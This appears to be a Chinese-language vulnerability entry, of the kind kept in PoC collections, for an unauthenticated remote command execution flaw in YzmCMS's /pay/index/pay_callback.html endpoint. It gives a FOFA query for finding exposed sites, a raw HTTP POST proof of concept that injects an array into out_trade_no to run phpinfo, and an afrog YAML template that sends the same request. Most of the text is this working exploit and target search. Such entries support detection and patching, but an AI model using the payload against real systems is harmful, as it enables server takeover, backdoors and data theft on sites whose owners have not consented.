# YzmCMS接口存在pay_callback远程命令执行

YzmCMS是一款基于YZMPHP开发的一套轻量级开源内容管理系统,YzmCMS简洁、安全、开源、免费,可运行在Linux、Windows、MacOSX、Solaris等各种平台上,专注为公司企业、个人站长快速建站提供解决方案。

## fofa

```
app="yzmcms"
```

## poc

```
POST /pay/index/pay_callback.html HTTP/1.1
Host: your-ip
User-Agent: Mozilla/5.0 (X11; OpenBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36
Accept-Encoding: gzip
Content-Type: application/x-www-form-urlencoded
 
out_trade_no[0]=eq&out_trade_no[1]=1&out_trade_no[2]=phpinfo
```

![img](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407022240034.png)

![img](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407022240702.png)



## afrog

```yaml
id: YzmCMS-pay_callback-RCE

info:
  name: YzmCMS pay_callback 远程命令执行漏洞
  author: Superhero
  severity: high
  description: |-
    fofa: app="yzmcms"
    YzmCMS /pay/index/pay_callback.html接口存在远程命令执行漏洞，未经身份验证的远程攻击者可利用此漏洞执行任意系统指令，写入后门文件，最终可获取服务器权限。
  reference:
    - https://blog.csdn.net/m0_60571842/article/details/140112191
  tags: RCE
  

rules:
  r0:
    request:
      method: POST
      path: /pay/index/pay_callback.html
      headers:
        Content-Type: application/x-www-form-urlencoded
      body: out_trade_no[0]=eq&out_trade_no[1]=1&out_trade_no[2]=phpinfo
    expression: response.status == 200 && response.body.bcontains(b'phpinfo()') && response.body.bcontains(b'PHP Version')

expression: r0() 

```